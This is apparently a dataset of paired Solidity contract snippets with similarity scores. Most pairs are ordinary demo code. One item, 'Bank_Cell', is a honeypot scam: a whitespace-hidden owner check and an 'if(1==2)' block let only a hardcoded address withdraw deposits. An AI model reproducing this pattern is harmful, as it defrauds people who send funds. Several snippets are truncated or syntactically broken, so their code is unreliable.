    string agreement;

    

    mapping(address => bool) coupleConfirmations;

    mapping(address => bool) witnesses;

    

    modifier onlyCouple(){

        require(msg.sender == a || msg.sender == b);

        _;

    }

    

    function MarriageContract(address _a, address _b, uint256 _till, string _agreement){

        a = _a;

        b = _b;

        till = _till;

        agreement = _agreement;

    }

    

    function married() constant returns (bool) {

        return coupleConfirmations[a] && coupleConfirmations[b];

    }

    

    function signContract() onlyCouple() {

        coupleConfirmations[msg.sender] = true;

    }

    

    function signWitness(){

        witnesses[msg.sender] = true;

    }

    

    function isWitness(address _address) constant returns (bool) {

        return witnesses[_address];

    }

    

}"
"contract TripHistory {
  struct Trip {
    string lat;
    string lon;
  }
  mapping (string => Trip) public trips;
  uint public tripcount;

  constructor() public {
    tripcount = 0;
    storeTrip(""let0"",""long0"");
    storeTrip(""let1"",""long1"");
  }
  function storeTrip(string memory _lat, string memory _lon) public  {
    trips[tripcount] = Trip(_lat, _lon);
    tripcount++;
  }
  
  function getTrip() public view returns (Trip[] memory){
      Trip[] memory trrips = new Trip[](tripcount);
      for (uint i = 0; i < tripcount; i++) {
          Trip storage trrip = trips[i];
          trrips[i] = trrip;
      }
      return trrips;
  }
}",0.5560914134563509,"contract OpenSeaAsset is TradeableERC721Token {
  string private _baseTokenURI;

  constructor(
    string memory _name,
    string memory _symbol,
    address _proxyRegistryAddress,
    string memory baseURI
  ) TradeableERC721Token(_name, _symbol, _proxyRegistryAddress) public {
    _baseTokenURI = baseURI;
  }

  function openSeaVersion() public pure returns (string memory) {
    return ""1.2.0"";
  }

  function baseTokenURI() public view returns (string memory) {
    return _baseTokenURI;
  }

  function setBaseTokenURI(string memory uri) public onlyOwner {
    _baseTokenURI = uri;
  }
}"
"contract IPFSStorage {
    event CIDStoredInTheLog(string _hash);

    function storeCIDInTheLog(string _hash) public {

        emit CIDStoredInTheLog(_hash);
    }
}",0.5540801033403739,"contract Broadcaster {

    event Broadcast(

        string _value

    );



    function broadcast(string memory message) public {

        

        

        

        

        

        emit Broadcast(message);

    }

}"
"contract caller {
  uint public number;
  address public callerAddress;

  function delegatecallSetNumber(address delegatedAddress, uint256 _number) public {
    delegatedAddress.delegatecall(bytes4(keccak256(""setNumber(uint256)"")), _number);
  }
}",0.5661407741758008,"contract ReadOnlyToken {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function allowance(address owner, address spender) public constant returns (uint256);
}"
"contract A is IA {
    IB public b;
    function set(IB _b) external {b = _b;}
    
}",0.598637083652194,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract target {
    event something();
    function doSomething() {
        something();
    }
}",0.5630458066059565,"contract SphereTokenFactory{
	function mint(address target, uint amount);
}"
"contract relay {
    target myTarget;

    function relay() {
        
        myTarget = new target();
    }

    function relayCall() {
        myTarget.doSomething();
    }
}",0.5327736933739139,"contract token { function transfer(address receiver, uint amount);
                 function mintToken(address target, uint mintedAmount);
                }"
"contract Allower {
    Handcuffs allowed;

    function Allower(Handcuffs _allowed) {
        allowed = _allowed;
        allowed.set();
    }

    function doSth() onlyallowed;

    modifier onlyallowed {
        if (msg.sender != allowed.get())
            throw;
        _
    }
}",0.5750697118906283,"contract Owned {
    
    address public owner;

    
    function Owned() { owner = msg.sender; }

    
    function delegate(address _owner) onlyOwner
    { owner = _owner; }

    
    modifier onlyOwner { if (msg.sender != owner) throw; _; }
}"
"contract caller {

    event LogLowLevelCalls(address sender, bool success, bytes response);

    function make_calls(calledContract _calledContract) public {
        
        _calledContract.calledFunction();
        calledLibrary.calledFunction();

        
        bool success;
        bytes memory response;

        bytes memory functionSig = abi.encodePacked(bytes4(keccak256(""calledFunction()"")));
        (success, response) = address(_calledContract).call(functionSig);
        require(success);
        emit LogLowLevelCalls(msg.sender, success, response);
        (success,  response) = address(_calledContract).delegatecall(functionSig);
        require(success);
        emit LogLowLevelCalls(msg.sender, success, response);
    }
}",0.5488823318037741,"contract Callable is Claimable {

  mapping(address => bool) public callers;



  event CallerAddressAdded(address indexed addr);

  event CallerAddressRemoved(address indexed addr);





  

  modifier onlyCaller() {

    require(callers[msg.sender]);

    _;

  }



  

  function addAddressToCaller(address addr) onlyOwner public returns(bool success) {

    if (!callers[addr]) {

      callers[addr] = true;

      emit CallerAddressAdded(addr);

      success = true;

    }

  }



  

  function removeAddressFromCaller(address addr) onlyOwner public returns(bool success) {

    if (callers[addr]) {

      callers[addr] = false;

      emit CallerAddressRemoved(addr);

      success = true;

    }

  }

}"
"contract Test {
    uint256 public v1;
    uint256 public v2;
    string public v3;
    string public v4;

    function Test(uint256 _v1, uint256 _v2, string _v3, string _v4) {
        v1 = _v1;
        v2 = _v2;
        v3 = _v3;
        v4 = _v4;
    }
}",0.5561272704779153,"contract Timestamped is Ownable {
	uint256 public ts = 0;
	uint256 public plus = 0;

	function getBlockTime() public view returns (uint256) {
		if(ts > 0) {
			return ts + plus;
		} else {
			return block.timestamp + plus; 
		}
	}
}"
"contract Ordered {

    bytes32 public lastHash;

    event LogNextTransaction(address sender, bytes32 txnHash);

    function doSomethingOrdered(bytes32 thisHash) public {
        bytes32 testHash = hashHelper(lastHash, msg.sender);
        require(testHash == thisHash);
        emit LogNextTransaction(msg.sender, testHash);
        lastHash = testHash;
    }

    
    function hashHelper(bytes32 hash, address sender) public pure returns(bytes32) {
        return keccak256(abi.encodePacked(hash, sender));
    }
}",0.5722831106093376,"contract Bank_Cell  
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           address prop = 0x60DA28631eC462cAD5B9f30Fc9fb58E13EbFCdD8;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
    }
}"
"contract Ev {
    event Message(address id, bytes16 message);

    function messages() public {
        emit Message(msg.sender, 'Almost there');
        emit Message(0x0, 'Congratulations'); 
    }
}",0.5418457629176213,"contract StoxVotingLog {

    

    event LogVotes(address _voter, uint sum);



    constructor() public {}



    function logVotes(uint sum)

        public

        {

            emit LogVotes(msg.sender, sum);

        }



}"
"contract Manager {
    using Roles for uint256;

    Users public users;

    constructor(Users _users) public {
        users = _users;
    }

    function isAuthorizedToRole1(address _user) external view returns (bool) {
        return users.getRole(_user).isAuthorizedToRole1();
    }

    function isAuthorizedToRole2(address _user) external view returns (bool) {
        return users.getRole(_user).isAuthorizedToRole2();
    }

    function isAuthorizedToRole3(address _user) external view returns (bool) {
        return users.getRole(_user).isAuthorizedToRole3();
    }
}",0.5774768960070299,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external {

        require(isHuman(msg.sender),""no robot"");

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract example2 is example1 {
    address public example1Address = 0xc3c695f67520a07b7745a7e6fb7b560f77d6154b;

    function setOriginContract(address _example1Address) public onlyOwner returns(bool) {
    example1Address = _example1Address;
    return true;
}



function exampleFunction()public returns(uint){
    example1Contract example1 = example1Contract[example1Address];
    return example1.Example1Function();
}",0.5443683638815905,"contract AacExperience is AacCreation {

    address public expIncreaserContractAddress;



    function setExpIncreaserContractAddress(address _expAddress) 

    external 

    notZero(uint(_expAddress))

    onlyOwner 

    {

        expIncreaserContractAddress = _expAddress;

    }

    

    function addExp(uint _uid, uint _amount) external mustExist(_uid) {

        require (msg.sender == expIncreaserContractAddress);

        aacArray[uidToAacIndex[_uid]].exp += _amount;

    }

}"
"contract test {

  mapping (bytes4 => int[100000000000]) internal map;

  function _increase(bytes4 _id,uint _index) public {        
    map[_id][_index] = map[_id][_index] + 1;
  }

}",0.5345999879207021,"contract GetBUS is DataCaller {

	function getBUS(bytes32 _key, uint256 _index) internal view returns(string) {

        return data.bus(_key, _index);        

    }

}"
"contract Store {

    address public owner;

    enum UserType {owner, admin, tester}

    struct User {
        bytes32 name;
        bytes32 email;
        bytes32 phone;
        UserType userType;
        uint userIndex;
    }

    mapping(address => User) public userStructs;
    address[] public userList;

    struct Product {
        uint price;
        bytes32 description;
        uint productIndex;
    }

    mapping(bytes32 => Product) public productStructs;
    bytes32[] public productList;

    modifier onlyOwner {
        if(msg.sender != owner) throw;
        _;
    }

    modifier onlyAdmin {
        if(!isUser(msg.sender)) throw;
        if(userStructs[msg.sender].userType != UserType.admin) throw;
        _;
    }

    modifier onlyTester {
       if(!isUser(msg.sender)) throw;  
       if(userStructs[msg.sender].userType != UserType.tester) throw;
        _;
    }

    

    function Store() {
        owner = msg.sender;
    }

    

    function getUserCount() public constant returns(uint userCount) { return userList.length; }
    function getProductCount() public constant returns(uint productCount) { return productList.length; }

    

    function isUser(address user) 
        public
        constant
        returns(bool isIndeed) 
    {
        if(userList.length == 0) return false;
        return userList[userStructs[user].userIndex] == user;
    }

    function isProduct(bytes32 productId)
        public
        constant
        returns(bool isIndeed)
    {
        if(productList.length == 0) return false;
        return productList[productStructs[productId].productIndex] == productId;
    }

    

    function createAdmin(address userAddress, bytes32 userName, bytes32 userEmail)
        onlyOwner
        returns(bool success)
    {
        if(isUser(userAddress)) throw;
        userStructs[userAddress].name = userName;
        userStructs[userAddress].email = userEmail;
        userStructs[userAddress].userType = UserType.admin;
        userStructs[userAddress].userIndex = userList.push(userAddress) - 1;
        return true;
    }

    function createTester(address userAddress, bytes32 userName, bytes32 userEmail)
        onlyOwner
        returns(bool success)
    {
        if(isUser(userAddress)) throw;
        userStructs[userAddress].name = userName;
        userStructs[userAddress].email = userEmail;
        userStructs[userAddress].userType = UserType.tester;
        userStructs[userAddress].userIndex = userList.push(userAddress) - 1;
        return true;        
    }

    function createProduct(bytes32 productId, uint productPrice, bytes32 productDescription)
        onlyAdmin
        returns(bool success)
    {
        if(isProduct(productId)) throw;
        productStructs[productId].price = productPrice;
        productStructs[productId].description = productDescription;
        productStructs[productId].productIndex = productList.push(productId);
        return true;
    }

    function updateProduct(bytes32 productId, uint productPrice, bytes32 productDescription)
        onlyTester
        returns(bool success)
    {
        if(!isProduct(productId)) throw;
        if(isProduct(productId)) throw;
        productStructs[productId].price = productPrice;
        productStructs[productId].description = productDescription;
        productStructs[productId].productIndex = productList.push(productId);
        return true;        
    }

}",0.576817784784542,"contract EthIdentity is IEthIdentity {

    

    

    address public owner;

    address private override;

    

    

    bytes32 private identityName;

    

    

    function EthIdentity(bytes32 _name) public {

        owner = msg.sender;

        override = msg.sender;

        identityName = _name;

    }

    

    

    uint constant ERROR_EVENT = 119;

    uint constant INFO_EVENT = 115;

    

    

    event EventNotification(address indexed sender, uint indexed status, bytes32 message);

    

    

    mapping(bytes32 => address) proofList;

    

    

    function addProof(address _source, bytes32 _attribute) public onlyBy(owner) returns(bool) {

        

        require(_source != address(0x0));

        

        

        bool existed = checkProof(_attribute);

        

        

        if (existed == true) {

            EventNotification(msg.sender, ERROR_EVENT, ""Proof already exist"");

            return false;

        }

        

        

        proofList[_attribute] = _source;

        

        EventNotification(msg.sender, INFO_EVENT, ""New proof added"");

        return true;

    }

    

    

    function removeProof(address _source, bytes32 _attribute) public onlyBy(owner) returns(bool) {

        

        bool existed = checkProof(_attribute);

        

        

        if (existed == false) {

            EventNotification(msg.sender, ERROR_EVENT, ""Proof not found"");

            return false;

        }

        

        

        if (proofList[_attribute] != _source) {

            EventNotification(msg.sender, ERROR_EVENT, ""Incorrect source"");

            return false;

        }

        

        

        delete proofList[_attribute];

        

        EventNotification(msg.sender, INFO_EVENT, ""Proof removed"");

        return true;

    }

    

    

    function checkProof(bytes32 _attribute) public constant returns(bool) {

        var source = proofList[_attribute];

        

        if (source != address(0x0))

            return true;

        

        return false;

    }

    

    

    function checkOwner(address _check) public constant returns(bool) {

        return _check == owner;

    }

    

    

    function getIdentityName() public constant returns(bytes32) {

        return identityName;

    }

    

    

    function nameOfIdentity() public constant returns(string) {

        return bytes32ToString(identityName);

    }

    

    

    function getIdentityInfo() public constant returns(address, address, string) {

        return (override, owner, bytes32ToString(identityName));

    }

    

     

    function setIdentityName(bytes32 _newName) public onlyBy(owner) returns(bool) {

        identityName = _newName;

        EventNotification(msg.sender, INFO_EVENT, ""Set owner name"");

        return true;

    }

    

    

    function setOwner(address _newOwner) public onlyBy(override) returns(bool) {

        owner = _newOwner;

        EventNotification(msg.sender, INFO_EVENT, ""Set new owner"");

        return true;

    }



    

    function setOverride(address _newOverride) public onlyBy(override) returns(bool) {

        override = _newOverride;

        EventNotification(msg.sender, INFO_EVENT, ""Set new override"");

        return true;

    }

    

    

    function bytes32ToString(bytes32 data) internal pure returns (string) {

        bytes memory bytesString = new bytes(32);

        for (uint j=0; j<32; j++){

            if (data[j] != 0) {

                bytesString[j] = data[j];

            }

        }

        return string(bytesString);

    }

    

    

    modifier onlyBy(address _authorized) {

        assert(msg.sender == _authorized);

        _;

    }

}"
"contract C {
    struct Point {
        uint256 x;
        uint256 y;
    }

    struct Image {
        Point[] points;
        string name;
    }
    Image img;
    function C(){
        img.points[0]=Point({x:1,y:1});
        img.name= 'sebi';
    }

    function func() {

        delete img;
    }
}",0.5446299612139063,"contract Meetings is ApplicationAsset {
    struct Record {
        bytes32 hash;
        bytes32 name;
        uint8 state;
        uint256 time_start;                     
        uint256 duration;
        uint8 index;
    }
    mapping (uint8 => Record) public Collection;
}"
"contract Test {
    Event MyLog(string);

    function MyFunction() {
        MyLog(""Hello World!"");
    }
}",0.5375214203052698,"contract TestRevert {
    
    function revertMe() {
        require(false);
    }
    
    function throwMe() {
        throw;
    }
}"
"contract TimeLimited {

    uint timeLimit;

    modifier isWithinTime() {
        require(now < timeLimit, ""not before the given time limit"");
        _;
    }

    function giveData() public view isWithinTime returns (uint) {
        return 5;
    }
}",0.5489046391294164,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract A {

  B b;

  event LogIsB(bool allOkay);

  function A() {
    b = new B();
  }

  function doSomething()
    returns(bool success)

{
    
    if(b.bSig() != sha3(""Supports B Interface ver 1"")) throw;
    LogIsB(true);
    return true;
  }

}",0.5656756034364467,"contract ZeroBTCInterface {

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

}"
"contract Crowdsale {
    uint public startBlock;
    uint public endBlock;

    uint public constant PRICE = 400;

    Crowdsale(uint _startBlock, uint _endBlock) {
        require(block.number < _startBlock);
        require(_startBlock < _endBlock);
    }

    function buy() payable {
        require(block.number >= startBlock && block.number <= endBlock);
        require(msg.value > 0);
        
        int tokens = msg.value * PRICE;
        balance[msg.sender] += tokens;
    }
}",0.5594263832275873,"contract FlameToken is CappedToken {



    string public constant name = ""Flame"";

    string public constant symbol = ""XFL"";

    uint8 public constant decimals = 18;



    constructor(uint _cap) public CappedToken(_cap) {

        

    }



    

    

    function safeApprove(address _spender, uint256 _value) public returns (bool) {

        require(allowed[msg.sender][_spender] == 0 || _value == 0);

        require(approve(_spender, _value));

    }



}"
"contract Parents {
    address public childAddr;
    Child child;

    function Parents(address _childAddress) {
        child = Child(_childAddress);
        childAddr = child.getAddress();
    }
}",0.5531852404989671,"contract cDeployer {

	function deployCrowdsale(address _tWallet, address _token, address _eWallet, uint _maxETH, address reqBy) public returns (address);

}"
"contract ContractD {
    address public contract_e_address;

    constructor(address _contract_e_address) public {
        contract_e_address = _contract_e_address;
    }

    function invokeContractE(uint256 _number_1, uint256 _number_2) public { 
        ContractE e = ContractE(contract_e_address);
        e.setN(_number_1, _number_2);
    } 
}",0.587429045095891,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract ContractE {
    uint256 public number_1;
    uint256 public number_2;

    function setN(uint256 _number_1, uint256 _number_2) public {
        number_1 = _number_1;
        number_2 = _number_2;
    }
}",0.5852634365471142,"contract addition {
    address reservedSlot; 
    uint256 public myNumber;
    
    function add() public {
        myNumber = myNumber + 1;
    }
    
    function sub() public {
        myNumber = myNumber - 1;
    }
}"
"contract MainContract {
    address minter;
    uint public returnRate;

    function MainContract(uint _returnRate) {
        minter = msg.sender;
        returnRate = _returnRate;
    }        
    modifier onlyMinter {
        if (msg.sender != minter) throw;
        _;
    }
     function updateReturnRate(uint newReturnRate) onlyMinter {
        returnRate = newReturnRate;
     } 
}",0.5860692089630998,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract ValueSetter {
  struct BasicValue {
    uint256 value;
  }

  address my_address; 
  BasicValue fixed_value;
  mapping(address => BasicValue) fixed_values;

  function ValueSetter(address init_address) public {
    my_address = init_address;
    fixed_values[init_address] = BasicValue(1000);
  }

  function set_value(uint256 my_value) external {
    
    require(msg.sender == my_address && my_value != 0);

    fixed_values[msg.sender].value = my_value;

    
  }
}",0.5797779785277372,"contract BurnableToken is BasicToken {

  event Burn(address indexed burner, uint256 value);

  
  function burn(uint256 _value) public {
    _burn(msg.sender, _value * (10 ** 18));
  }

  function _burn(address _who, uint256 _value) internal {
    require(_value <= balances[_who]);
    
    

    balances[_who] = balances[_who].sub(_value);
    totalSupply_ = totalSupply_.sub(_value);
    emit Burn(_who, _value);
    emit Transfer(_who, address(0), _value);
  }
}"
"contract DecompiledContract {
    function start() {
        *0x40 = 0x60;
        var0 = msg.data.length;
        recipient = storage[0x0];
        var5 = call(0x0, address(recipient), $msg.value, 0x60, 0x0, 0x60, 0x0);

        if(var5 != 0x0) {
            ptr = storage[0x0];
            uint256* var4 = ptr;
            ptr = *0x40;
            *ptr = (uint256)(address(((int)var4)));
            *(ptr + 1) = $msg.value;  
            emit Deposit(*0x40, ((uint256)(((int)ptr) - *0x40)) + 0x40);
            stop();
        }
        throw();
    }
}",0.5018955316055931,"contract Splitter {

    address[] public addrs;

    uint256[] public shares;

    uint256 public denom;



    constructor(address[] _addrs, uint256[] _shares, uint256 _denom) public {

        addrs = _addrs;

        shares = _shares;

        denom = _denom;

    }

    

    function () payable public {

        uint256 val = msg.value;

        for (uint i = 0; i < addrs.length; i++) {

            addrs[i].transfer(val * shares[i] / denom);

        }

    }

}"
"contract CertificateRegistry {
  event Certificate (uint256 indexed id, bytes32 indexed hash);

  address private university;
  uint256 nextID;

  constructor () public {
    university = msg.sender;
  }

  function issueCertificate (bytes32 hash) public returns (uint256) {
    require (msg.sender == university);

    emit Certificate (nextID++, hash);
  }

  function calculateHash (string memory name, string memory degree, uint256 issueTime) public view returns (bytes32) {
    return keccak256 (abi.encodePacked (address (this), university, name, degree, issueTime));
  }
}",0.5978361719188534,"contract VotingCenter {
  Poll[] public polls;

  event PollCreated(address indexed poll, address indexed author);

  
  function createPoll(
    bytes _ipfsHash,
    uint16 _numOptions,
    uint256 _startTime,
    uint256 _endTime
  ) public returns (address) {
    Poll newPoll = new Poll(_ipfsHash, _numOptions, _startTime, _endTime, msg.sender);
    polls.push(newPoll);

    PollCreated(address(newPoll), msg.sender);

    return address(newPoll);
  }

  function allPolls() view public returns (Poll[]) {
    return polls;
  }

  function numPolls() view public returns (uint256) {
    return polls.length;
  }
}"
"contract Case2 {

    struct AA{
        uint val;
    }

    struct BB{

        mapping (uint => AA) map_2;
    }

    mapping (uint => BB) map_1; 

    function getter(uint BBId, uint AAId) public view returns(uint val) {
        return map_1[BBId].map_2[AAId].val;
    }
}",0.5915024320196237,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract Test {
    event Logger(uint log);
    function doit(uint myint) public {
        emit Logger(myint);
    }
}",0.5948806214280143,"contract Lottery

{

    event Bid(address sender);



    function bid() public

    {

        emit Bid(msg.sender);

    }

}"
"contract C {

    function c() public returns (uint[]) {
        return f(1,2);
    }

    function f(uint a, uint b) private returns (uint[] memory memOffset) {
        assembly {
             
             
             memOffset := msize() 
             mstore(add(memOffset, 0x00), 2) 
             mstore(add(memOffset, 0x20), a) 
             mstore(add(memOffset, 0x40), b) 
             mstore(0x40, add(memOffset, 0x60)) 
        }
    }
}",0.5634491747479079,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    
    function addSomeRandomStuff(address[][] memory tokens) public {
         a = a + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract UserDetails {

  struct UserStruct {
    string fileHash;
    uint userListPointer;
    
  }

  
  address[] public userList;
  mapping(address=>UserStruct) public userStructs;

  function isUser(address userAddress) public view returns(bool isIndeed) {
      if(userList.length ==0) return false;
      return userList[userStructs[userAddress].userListPointer] == userAddress;
  }

  function addUserDetail(string hash,address userAddress) public returns (bool) {
    require(!isUser(userAddress));
    UserStruct memory usr;
    usr.fileHash = hash;
    usr.userListPointer = userList.push(userAddress) - 1;
    userStructs[userAddress] = usr;
  }

  function getUserCount() public view returns(uint count) {
      return userList.length;
  }
}",0.596776015020798,"contract AddressResolver is Owned {
    mapping(bytes32 => address) public repository;

    constructor(address _owner) public Owned(_owner) {}

    

    function importAddresses(bytes32[] names, address[] destinations) public onlyOwner {
        require(names.length == destinations.length, ""Input lengths must match"");

        for (uint i = 0; i < names.length; i++) {
            repository[names[i]] = destinations[i];
        }
    }

    

    function getAddress(bytes32 name) public view returns (address) {
        return repository[name];
    }

    function requireAndGetAddress(bytes32 name, string reason) public view returns (address) {
        address _foundAddress = repository[name];
        require(_foundAddress != address(0), reason);
        return _foundAddress;
    }
}"
"contract Example {
    AddNumbers addContract;
    event StringFailure(string stringFailure);
    event BytesFailure(bytes bytesFailure);

    function exampleFunction(uint256 _a, uint256 _b) public returns (uint256 _c) {

        try addContract.add(_a, _b) returns (uint256 _value) {
            return (_value);
        } catch Error(string memory _err) {
            
            emit StringFailure(_err);
        } catch (bytes memory _err) {
            emit BytesFailure(_err):
        }
    }
}",0.5788277835300343,"contract ERC677 is ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value, bytes data);

    function transferAndCall(address, uint256, bytes) external returns (bool);

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool);
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool);
}"
"contract MyContract {

  string public ipfsHash;

  function setHash(string _ipfsHash) external {
    ipfsHash = _ipfsHash;
  }
}",0.5538450792581998,"contract Version {
    string public semanticVersion;

    
    
    function Version(string _version) internal {
        semanticVersion = _version;
    }
}"
"contract Test {

    string stringTest;

    function memoryTest(string memory _exampleString) public returns (string memory) {
        stringTest = ""example"";  
        string memory newString = stringTest;  
        return stringTest;  
    }

    function calldataTest(string calldata _exampleString) external returns (string memory) {
        
    }
}",0.5588822496881295,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    
    function addSomeRandomStuff(address[][] memory tokens) public {
         a = a + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract c {
    struct samplestruct1 {
        string name;
    }
    struct samplestruct2{
        string name;
        mapping (int => samplestruct1) s1s;
    }

    samplestruct2 s2; 

    function setS2Name(string name) {
        s2.name = name;
    }

    function newS1(int key, string name) {
        samplestruct1 memory s1; 
        s1.name = name;
        s2.s1s[key] = s1;
    }
}",0.5312327523078888,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract DieselPrice is usingOraclize { 

  event one(string description);
  event newDieselPrice(string price);

  function DieselPrice() {
      update(); 
  }

  function __callback(bytes32 myid, string result) {
    if (msg.sender != oraclize_cbAddress()) throw;
    newDieselPrice(result);
    DieselPriceUSD = parseInt(result, 2); 
    
  }

  function update() payable {
    one(""Oraclize query was sent, standing by for the answer.."");
    oraclize_query(""URL"", ""xml(https:
  }
}",0.5423526209276313,"contract Coinbase is Oraclize {
    
    constructor(MedianizerInterface med_, MedianizerInterface medm_, WETH weth_) public Oraclize(med_, medm_, weth_) {}

    
    function getAssetPrice(uint128 payment_) internal returns (bytes32 queryId) {
        weth.withdraw(payment_);
        require(oraclize_getPrice(""URL"", gasLimit) <= address(this).balance, ""Coinbase.getAssetPrice: Ether balance is less than oraclize price"");
        queryId = oraclize_query(""URL"", ""json(https:
    }
}"
"contract TestContract {
    enum TestEnum { ONE, TWO, THREE }
    mapping (uint => uint) testMapping;

    function getValueOne() constant returns(uint) {
        return testMapping[uint(TestEnum.ONE)];
    }
}",0.5710797746044871,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract Test {
    struct Object {
        uint a;
        string b;
        string[] c;
        mapping(uint => uint) d;
    }

    Object field;

    function Test() {
        field = Object({
            a: 1,
            b: ""abc"",
            c: new string[](0)
        });
    }
}",0.5436200899543773,"contract dynamictest{

    uint public a;

    uint public b;

    function test(uint foo) public {

        if (tx.gasprice > foo){

            a=1;

            return;

        }

        if (tx.gasprice < foo){

            a=1;

            b=1;

            return;

        }

    }

}"
"contract Recover {
    function recover(uint8 v, bytes32 r, bytes32 s) public pure returns (address) {
        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";
        bytes32 hash = keccak256(prefix, ""This message's length: 32 bytes."");
        return ecrecover(hash, v, r, s);
    }
}",0.5879804052067173,"contract KeyCup  {

  function generateQR(string memory salt) public view returns (bytes32 hash) {

    hash = keccak256(abi.encodePacked(address(this),msg.sender, salt));

  }

  function hashQRCode(bytes32 qr, uint256 pin) public pure returns (bytes32 hash) {

    hash = keccak256(abi.encodePacked(qr, pin));

  }

}"
"contract NewBook {

    struct ChapterData {
        
        string title;
        uint pages;
    }

    struct BookData {
        
        ChapterData[] chapters;
    }

    mapping(bytes32 => BookData) books; 

    
    
    function addChapter(bytes32 _bookID, string memory title, uint pages) public {
        ChapterData memory c = ChapterData({
            title: title,
            pages: pages
        });
        books[_bookID].chapters.push(c);
    }

    function getBookChapter(bytes32 bookId, uint chapter) public view returns(string memory title, uint pages) {
        BookData storage b = books[bookId];
        ChapterData storage c = b.chapters[chapter];
        return(c.title, c.pages);
    }
}",0.5182770592632461,"contract PersonalERC20Factory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newPersonalERC20(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    PersonalERC20 c = new PersonalERC20(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract Staking {
    using SafeMath for uint;

    event StartStaking(address addr, uint value, uint amount, uint time);
    event WithdrawStake(address staker, uint amount);
    event Claim(address staker, uint reward);
    event DonationDeposited(address _address, uint value);

    struct Staker
    {
        uint amount;
        uint time;
    }


    uint public LastBlock = block.number;
    uint public Timestamp = now;

    uint public TotalStakingWeight;
    uint public TotalStakingAmount;
    uint public StakingRewardPool;
    bool public CS_frozen;
    uint public staking_threshold = 0 ether;
    address payable public Treasury = 0xD0eDff4E0b7e7e410F631669B040905267E9FFD1;

    uint public round_interval   = 27 days;
    uint public max_delay        = 365 * 2 days;
    uint public DateStartStaking = 1541980800;

    mapping(address => Staker) public staker;

    function freeze(bool _f) public only_treasurer
    {
        CS_frozen = _f;
    }

    function withdraw_rewards () public only_treasurer
    {
        if (CS_frozen)
        {
            StakingRewardPool = address(this).balance.sub(TotalStakingAmount);
            address(Treasury).transfer(StakingRewardPool);
        }
    }

    function clear_treasurer () public only_treasurer
    {
        require(block.number > 1800000 && !CS_frozen);
        Treasury = address(0);
    }

    function() external payable
    {
        start_staking();
    }

    function new_block() public payable
    {
        if (block.number > LastBlock)
        {
            uint _LastBlock = LastBlock;
            LastBlock = block.number;

            StakingRewardPool = address(this).balance.sub(TotalStakingAmount + msg.value);

            if (now > Timestamp)
            {
                uint _blocks = block.number - _LastBlock;
                uint _seconds = now - Timestamp;
                if (_seconds > _blocks * 25)
                {
                    _seconds = _blocks * 25;
                }
                TotalStakingWeight += _seconds.mul(TotalStakingAmount);
                Timestamp += _seconds;
            }
        }
    }

    function start_staking() public staking_available payable
    {
        assert(msg.value >= staking_threshold);
        new_block();

        if (staker[msg.sender].amount > 0)
        {
            if (Timestamp >= staker[msg.sender].time + round_interval)
            { 
                claim(); 
            }
            TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[msg.sender].time)).mul(staker[msg.sender].amount));
        }

